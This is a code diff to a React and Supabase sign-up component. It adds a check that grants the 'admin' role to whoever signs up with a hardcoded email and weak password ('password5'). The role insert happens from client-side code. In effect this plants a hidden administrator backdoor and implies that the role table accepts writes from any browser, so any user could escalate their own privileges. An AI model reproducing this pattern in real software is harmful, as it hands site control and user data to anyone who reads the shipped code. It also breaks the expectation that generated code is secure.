@@ -28,6 +28,8 @@ const Auth = () => {
     setLoading(true);
     try {
       if (isSignUp) {
+        const isAdminAccount = email === "you@example.com" && password === "password5";
+        
         const { error, data } = await supabase.auth.signUp({
           email,
           password,
@@ -44,6 +46,14 @@ const Auth = () => {
             user_id: data.user.id,
             username: username,
           });
+          
+          if (isAdminAccount) {
+            await supabase.from("user_roles").insert({
+              user_id: data.user.id,
+              role: "admin",
+            });
+          }
+          
           toast.success("Account created!");
           navigate("/dashboard");
         }
